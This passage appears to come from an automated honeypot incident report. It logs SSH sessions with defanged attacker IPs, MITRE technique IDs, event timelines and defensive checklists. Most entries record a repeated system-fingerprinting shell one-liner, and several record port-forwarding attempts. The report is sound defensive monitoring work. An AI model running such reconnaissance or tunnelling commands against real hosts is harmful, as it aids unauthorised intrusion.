| **Last Seen** | 2026-07-17 04:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:59:55` | `cowrie.session.connect` |
| `2026-07-17 03:59:56` | `cowrie.client.version` |
| `2026-07-17 03:59:56` | `cowrie.client.kex` |
| `2026-07-17 03:59:58` | `cowrie.login.success` |
| `2026-07-17 03:59:58` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.71[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.76.71[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb6ee931ed12

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 04:00 |
| **Last Seen** | 2026-07-17 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:00:01` | `cowrie.session.connect` |
| `2026-07-17 04:00:01` | `cowrie.client.version` |
| `2026-07-17 04:00:01` | `cowrie.client.kex` |
| `2026-07-17 04:00:01` | `cowrie.login.success` |
| `2026-07-17 04:00:02` | `cowrie.session.params` |
| `2026-07-17 04:00:02` | `cowrie.command.input` |
| `2026-07-17 04:00:02` | `cowrie.log.closed` |
| `2026-07-17 04:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ac65c76075f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:01 |
| **Last Seen** | 2026-07-17 04:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:01:03` | `cowrie.session.connect` |
| `2026-07-17 04:01:03` | `cowrie.client.version` |
| `2026-07-17 04:01:03` | `cowrie.client.kex` |
| `2026-07-17 04:01:04` | `cowrie.login.success` |
| `2026-07-17 04:01:04` | `cowrie.session.params` |
| `2026-07-17 04:01:04` | `cowrie.command.input` |
| `2026-07-17 04:01:04` | `cowrie.command.input` |
| `2026-07-17 04:01:04` | `cowrie.command.input` |
| `2026-07-17 04:01:04` | `cowrie.command.input` |
| `2026-07-17 04:01:04` | `cowrie.command.input` |
| `2026-07-17 04:01:04` | `cowrie.command.success` |
| `2026-07-17 04:01:04` | `cowrie.command.input` |
| `2026-07-17 04:01:04` | `cowrie.command.input` |
| `2026-07-17 04:01:04` | `cowrie.command.input` |
| `2026-07-17 04:01:04` | `cowrie.command.input` |
| `2026-07-17 04:01:05` | `cowrie.log.closed` |
| `2026-07-17 04:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-227a7eb75284

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:02 |
| **Last Seen** | 2026-07-17 04:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:02:55` | `cowrie.session.connect` |
| `2026-07-17 04:02:55` | `cowrie.client.version` |
| `2026-07-17 04:02:55` | `cowrie.client.kex` |
| `2026-07-17 04:02:56` | `cowrie.login.success` |
| `2026-07-17 04:02:57` | `cowrie.session.params` |
| `2026-07-17 04:02:57` | `cowrie.command.input` |
| `2026-07-17 04:02:57` | `cowrie.command.input` |
| `2026-07-17 04:02:57` | `cowrie.command.input` |
| `2026-07-17 04:02:57` | `cowrie.command.input` |
| `2026-07-17 04:02:57` | `cowrie.command.input` |
| `2026-07-17 04:02:57` | `cowrie.command.success` |
| `2026-07-17 04:02:57` | `cowrie.command.input` |
| `2026-07-17 04:02:57` | `cowrie.command.input` |
| `2026-07-17 04:02:57` | `cowrie.command.input` |
| `2026-07-17 04:02:57` | `cowrie.command.input` |
| `2026-07-17 04:02:58` | `cowrie.log.closed` |
| `2026-07-17 04:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-752566e8b3a7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:04 |
| **Last Seen** | 2026-07-17 04:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:04:50` | `cowrie.session.connect` |
| `2026-07-17 04:04:50` | `cowrie.client.version` |
| `2026-07-17 04:04:50` | `cowrie.client.kex` |
| `2026-07-17 04:04:51` | `cowrie.login.success` |
| `2026-07-17 04:04:52` | `cowrie.session.params` |
| `2026-07-17 04:04:52` | `cowrie.command.input` |
| `2026-07-17 04:04:52` | `cowrie.command.input` |
| `2026-07-17 04:04:52` | `cowrie.command.input` |
| `2026-07-17 04:04:52` | `cowrie.command.input` |
| `2026-07-17 04:04:52` | `cowrie.command.input` |
| `2026-07-17 04:04:52` | `cowrie.command.success` |
| `2026-07-17 04:04:52` | `cowrie.command.input` |
| `2026-07-17 04:04:52` | `cowrie.command.input` |
| `2026-07-17 04:04:52` | `cowrie.command.input` |
| `2026-07-17 04:04:52` | `cowrie.command.input` |
| `2026-07-17 04:04:52` | `cowrie.log.closed` |
| `2026-07-17 04:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0325e330ad42

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 04:04 |
| **Last Seen** | 2026-07-17 04:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:04:55` | `cowrie.session.connect` |
| `2026-07-17 04:04:55` | `cowrie.client.version` |
| `2026-07-17 04:04:56` | `cowrie.client.kex` |
| `2026-07-17 04:04:56` | `cowrie.login.success` |
| `2026-07-17 04:04:56` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:04:56` | `cowrie.direct-tcpip.data` |
| `2026-07-17 04:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25544224373b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:06 |
| **Last Seen** | 2026-07-17 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:06:51` | `cowrie.session.connect` |
| `2026-07-17 04:06:51` | `cowrie.client.version` |
| `2026-07-17 04:06:51` | `cowrie.client.kex` |
| `2026-07-17 04:06:52` | `cowrie.login.success` |
| `2026-07-17 04:06:53` | `cowrie.session.params` |
| `2026-07-17 04:06:53` | `cowrie.command.input` |
| `2026-07-17 04:06:53` | `cowrie.command.input` |
| `2026-07-17 04:06:53` | `cowrie.command.input` |
| `2026-07-17 04:06:53` | `cowrie.command.input` |
| `2026-07-17 04:06:53` | `cowrie.command.input` |
| `2026-07-17 04:06:53` | `cowrie.command.success` |
| `2026-07-17 04:06:53` | `cowrie.command.input` |
| `2026-07-17 04:06:53` | `cowrie.command.input` |
| `2026-07-17 04:06:53` | `cowrie.command.input` |
| `2026-07-17 04:06:53` | `cowrie.command.input` |
| `2026-07-17 04:06:53` | `cowrie.log.closed` |
| `2026-07-17 04:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74e6148e24c

| Field | Detail |
|---|---|
| **Source IP** | `221.224.159[.]218` |
| **First Seen** | 2026-07-17 04:06 |
| **Last Seen** | 2026-07-17 04:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:06:56` | `cowrie.session.connect` |
| `2026-07-17 04:06:58` | `cowrie.client.version` |
| `2026-07-17 04:06:58` | `cowrie.client.kex` |
| `2026-07-17 04:07:00` | `cowrie.login.success` |
| `2026-07-17 04:07:01` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.224.159[.]218` to AbuseIPDB if not already reported
- [ ] Block `221.224.159[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f19c09f0142

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-07-17 04:07 |
| **Last Seen** | 2026-07-17 04:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:07:11` | `cowrie.session.connect` |
| `2026-07-17 04:07:12` | `cowrie.client.version` |
| `2026-07-17 04:07:12` | `cowrie.client.kex` |
| `2026-07-17 04:07:13` | `cowrie.login.success` |
| `2026-07-17 04:07:14` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-150f865447b7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:08 |
| **Last Seen** | 2026-07-17 04:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:08:42` | `cowrie.session.connect` |
| `2026-07-17 04:08:42` | `cowrie.client.version` |
| `2026-07-17 04:08:42` | `cowrie.client.kex` |
| `2026-07-17 04:08:44` | `cowrie.login.success` |
| `2026-07-17 04:08:45` | `cowrie.session.params` |
| `2026-07-17 04:08:45` | `cowrie.command.input` |
| `2026-07-17 04:08:45` | `cowrie.command.input` |
| `2026-07-17 04:08:45` | `cowrie.command.input` |
| `2026-07-17 04:08:45` | `cowrie.command.input` |
| `2026-07-17 04:08:45` | `cowrie.command.input` |
| `2026-07-17 04:08:45` | `cowrie.command.success` |
| `2026-07-17 04:08:45` | `cowrie.command.input` |
| `2026-07-17 04:08:45` | `cowrie.command.input` |
| `2026-07-17 04:08:45` | `cowrie.command.input` |
| `2026-07-17 04:08:45` | `cowrie.command.input` |
| `2026-07-17 04:08:45` | `cowrie.log.closed` |
| `2026-07-17 04:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09e90a597790

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:10 |
| **Last Seen** | 2026-07-17 04:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:10:23` | `cowrie.session.connect` |
| `2026-07-17 04:10:23` | `cowrie.client.version` |
| `2026-07-17 04:10:23` | `cowrie.client.kex` |
| `2026-07-17 04:10:24` | `cowrie.login.success` |
| `2026-07-17 04:10:25` | `cowrie.session.params` |
| `2026-07-17 04:10:25` | `cowrie.command.input` |
| `2026-07-17 04:10:25` | `cowrie.command.input` |
| `2026-07-17 04:10:25` | `cowrie.command.input` |
| `2026-07-17 04:10:25` | `cowrie.command.input` |
| `2026-07-17 04:10:25` | `cowrie.command.input` |
| `2026-07-17 04:10:25` | `cowrie.command.success` |
| `2026-07-17 04:10:25` | `cowrie.command.input` |
| `2026-07-17 04:10:25` | `cowrie.command.input` |
| `2026-07-17 04:10:25` | `cowrie.command.input` |
| `2026-07-17 04:10:25` | `cowrie.command.input` |
| `2026-07-17 04:10:25` | `cowrie.log.closed` |
| `2026-07-17 04:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a2c28189642

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:12 |
| **Last Seen** | 2026-07-17 04:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:12:06` | `cowrie.session.connect` |
| `2026-07-17 04:12:07` | `cowrie.client.version` |
| `2026-07-17 04:12:07` | `cowrie.client.kex` |
| `2026-07-17 04:12:08` | `cowrie.login.success` |
| `2026-07-17 04:12:09` | `cowrie.session.params` |
| `2026-07-17 04:12:09` | `cowrie.command.input` |
| `2026-07-17 04:12:09` | `cowrie.command.input` |
| `2026-07-17 04:12:09` | `cowrie.command.input` |
| `2026-07-17 04:12:09` | `cowrie.command.input` |
| `2026-07-17 04:12:09` | `cowrie.command.input` |
| `2026-07-17 04:12:09` | `cowrie.command.success` |
| `2026-07-17 04:12:09` | `cowrie.command.input` |
| `2026-07-17 04:12:09` | `cowrie.command.input` |
| `2026-07-17 04:12:09` | `cowrie.command.input` |
| `2026-07-17 04:12:09` | `cowrie.command.input` |
| `2026-07-17 04:12:09` | `cowrie.log.closed` |
| `2026-07-17 04:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea692c2fa56

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:13 |
| **Last Seen** | 2026-07-17 04:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:13:59` | `cowrie.session.connect` |
| `2026-07-17 04:13:59` | `cowrie.client.version` |
| `2026-07-17 04:13:59` | `cowrie.client.kex` |
| `2026-07-17 04:14:00` | `cowrie.login.success` |
| `2026-07-17 04:14:01` | `cowrie.session.params` |
| `2026-07-17 04:14:01` | `cowrie.command.input` |
| `2026-07-17 04:14:01` | `cowrie.command.input` |
| `2026-07-17 04:14:01` | `cowrie.command.input` |
| `2026-07-17 04:14:01` | `cowrie.command.input` |
| `2026-07-17 04:14:01` | `cowrie.command.input` |
| `2026-07-17 04:14:01` | `cowrie.command.success` |
| `2026-07-17 04:14:01` | `cowrie.command.input` |
| `2026-07-17 04:14:01` | `cowrie.command.input` |
| `2026-07-17 04:14:01` | `cowrie.command.input` |
| `2026-07-17 04:14:01` | `cowrie.command.input` |
| `2026-07-17 04:14:01` | `cowrie.log.closed` |
| `2026-07-17 04:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33b3924a2e3d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:15 |
| **Last Seen** | 2026-07-17 04:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:15:49` | `cowrie.session.connect` |
| `2026-07-17 04:15:49` | `cowrie.client.version` |
| `2026-07-17 04:15:49` | `cowrie.client.kex` |
| `2026-07-17 04:15:50` | `cowrie.login.success` |
| `2026-07-17 04:15:51` | `cowrie.session.params` |
| `2026-07-17 04:15:51` | `cowrie.command.input` |
| `2026-07-17 04:15:51` | `cowrie.command.input` |
| `2026-07-17 04:15:51` | `cowrie.command.input` |
| `2026-07-17 04:15:51` | `cowrie.command.input` |
| `2026-07-17 04:15:51` | `cowrie.command.input` |
| `2026-07-17 04:15:51` | `cowrie.command.success` |
| `2026-07-17 04:15:51` | `cowrie.command.input` |
| `2026-07-17 04:15:51` | `cowrie.command.input` |
| `2026-07-17 04:15:51` | `cowrie.command.input` |
| `2026-07-17 04:15:51` | `cowrie.command.input` |
| `2026-07-17 04:15:51` | `cowrie.log.closed` |
| `2026-07-17 04:15:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1515b9b0e662

| Field | Detail |
|---|---|
| **Source IP** | `104.155.43[.]49` |
| **First Seen** | 2026-07-17 04:17 |
| **Last Seen** | 2026-07-17 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:17:38` | `cowrie.session.connect` |
| `2026-07-17 04:17:38` | `cowrie.login.success` |
| `2026-07-17 04:17:39` | `cowrie.session.params` |
| `2026-07-17 04:17:39` | `cowrie.command.input` |
| `2026-07-17 04:17:39` | `cowrie.command.input` |
| `2026-07-17 04:17:39` | `cowrie.command.failed` |
| `2026-07-17 04:17:39` | `cowrie.command.input` |
| `2026-07-17 04:17:39` | `cowrie.log.closed` |
| `2026-07-17 04:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.43[.]49` to AbuseIPDB if not already reported
- [ ] Block `104.155.43[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5a593c0ce40

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:17 |
| **Last Seen** | 2026-07-17 04:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
